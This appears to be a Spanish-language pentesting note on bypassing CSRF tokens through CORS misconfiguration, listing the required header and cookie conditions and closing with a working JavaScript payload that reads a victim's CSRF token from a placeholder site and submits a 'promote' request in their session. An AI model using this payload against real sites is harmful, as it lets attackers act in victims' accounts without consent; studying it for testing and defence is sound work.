### Requisitos de implementación

Para poder realizar un baypass de CSRF token mediante CORS necesitamos:

- Que la header Access-Control-Allow-Origin esté seteada en wildcard o que sea reflectiva.
- Que la header Access-Control-Allow-Credentials esté seteada en true.
- Que la cookie tenga el atributo SameSite seteado en None.

### Theory

SI podemos bypassear la SOP mediante faltas de configuración de CORS, podemos acceder a la response que nos da el sitio a la cross-origin request que hicimos.

Esto nos permite crear una request al endpoint que crea los CSRF tokens, leer la response, extraer el token y ponerlo en nuestra nueva cross-origin request.

Dado que todo esto sucede en la sesión de la víctima, el token CSRF es válido incluso si se verifica correctamente y se vincula a la sesión de usuario de la víctima.

Sin embargo, para que el browser de la víctima envíe la cookie de sesión mediante JS requerimos que la cookie tenga de manera explícita el atributo **SameSite** seteado en **None**.

### Explotación

Podemos crear entonces un payload que realice la request en nombre de la víctima, lea la response, extraiga el valor del token para luego meterlo en una nueva request que lleva adelante la acción.

    <script>
    	// GET CSRF token
    	var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://vulnerablesite.com/profile.php', false);
        xhr.withCredentials = true;
        xhr.send();
        var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    	var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);
    
    	// do CSRF
        var csrf_req = new XMLHttpRequest();
        var params = `promote=user&csrf=${csrftoken}`;
        csrf_req.open('POST', 'https://vulnerablesite.com/profile.php', false);
    	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        csrf_req.withCredentials = true;
        csrf_req.send(params);
    </script>
